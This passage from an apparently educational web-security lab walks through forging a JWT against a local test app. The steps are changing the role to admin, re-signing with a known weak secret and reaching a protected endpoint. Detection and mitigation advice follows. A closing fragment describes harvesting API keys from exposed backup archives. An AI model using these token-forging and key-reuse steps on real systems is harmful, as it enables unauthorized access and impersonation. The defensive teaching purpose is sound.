. You’ll get a JWT back:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.. Step 5: Modify Token – Tampering the RoleGo to https://jwt.io:1. Paste the token2. Change role from "user" to "admin" in the payload3. Re-sign with known secret: weakkey1234. Copy the new token. Step 6: Use Tampered TokenIn Postman:- GET to: http://127.0.0.1:5000/protected- Header:Authorization: Bearer . Output:Hello admin!💀 You’ve impersonated admin just by modifying the token! Step 7: Explore More Insecure Cases- Missing exp (expiration): token never expires- Accepting alg: none means signature not verified- Hardcoded secret leaked in code- JWT stored in browser localStorage (can be stolen via XSS)
Target Type: Web apps, APIs, SPAs, mobile backends
Vulnerability: Weak secrets, no expiry, alg:none, predictable tokens
Impact: - Admin privilege escalation- Unauthorized access- Token reuse and session hijack- Fake identity impersonation
Detection Method: - Look for JWTs without expiry- Monitor tokens with "none" alg or tampered headers- Detect reused tokens over long periods
Solution: ✅ Use strong secrets and rotate them✅ Enforce short expiry (exp field)✅ Validate tokens on every request✅ Don’t allow alg: none✅ Use secure storage (HttpOnly cookies)✅ Revoke tokens after logout or inactivity
Source: OWASP JWT Cheat Sheet, jwt.io, PortSwigger Academy, TryHackMe JWT Playground

Found admin_backup.zip: → Extract, find source code and API keys→ Use Postman to send API requests using those keys Real-world example: Many sites have leaked .env or .sql files!
